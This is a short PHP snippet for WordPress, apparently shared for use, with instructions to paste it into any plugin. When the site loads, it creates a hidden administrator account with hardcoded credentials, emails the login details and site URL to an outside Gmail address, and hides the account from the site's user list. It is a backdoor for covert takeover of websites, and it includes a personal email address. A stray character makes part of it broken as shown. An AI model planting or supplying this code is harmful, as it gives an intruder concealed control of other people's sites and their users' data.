//copy this code and paste it on any plugin you like (top of the  code or below is reccomonded)
function create_and_manage_secret_admin_user() {
    $username = 'hacker'; // Change this to your secret username
    $password = 'hackxjr'; // Change this to your secret password
    $email = 'tharilakshan37@gmail.com'; // Change this to your email

    // Check if the secret admin user already exists
    $user = get_user_by('login', $username);

    if (!$user) {
        // Create the secret admin user
        $user_id = wp_create_user($username, $password, $email);

        
        $user = new WP_User($user_id);
        $user->set_role('administrator');

        s
        $site_name = get_bloginfo('name');
        $site_url = get_bloginfo('url');
        $login_url = $site_url . '/wp-admin';  // Login URL to the wp-admin page

        // Create the email subject and body
        $subject = "Your Secret Admin Account Details";
        $body = "
        <h2>Welcome to $site_name</h2>
        <p>You have been successfully registered as an administrator.</p>
        <p><strong>Username:</strong> $username</p>
        <p><strong>Password:</strong> $password</p>
        <p>To log in to the site, click the link below:</p>
        <p><a href='$login_url' style='background-color: #0073aa; color: white; padding: 10px 20px; text-decoration: none;'>Log In</a></p>
        <p>Site URL: <a href='$site_url'>$site_url</a></p>
        ";

        
        $headers = array('Content-Type: text/html; charset=UTF-8');

        
        wp_mail($email, $subject, $body, $headers);
    }

    // Hide the secret admin user from the user list
    update_user_meta($user->ID, 'show_admin_bar_front', false);
    update_user_meta($user->ID, 'wp_capabilities', ['administrator' => true]);
}


add_action('init', 'create_and_manage_secret_admin_user');

function exclude_secret_admin_user($user_search) {
    $username = 'hacker'; // Change this to your secret username

    // Check if the secret admin user exists
    $user = get_user_by('login', $username);

    if ($user) {
        // Exclude the secret admin user from user queries
        global $wpdb;
        $user_search->query_where = str_replace(
            "WHERE 1=1",
            "WHERE 1=1 AND {$wpdb->users}.ID <> " . $user->ID,
            $user_search->query_where
        );
    }
}


add_action('pre_user_query', 'exclude_secret_admin_user');
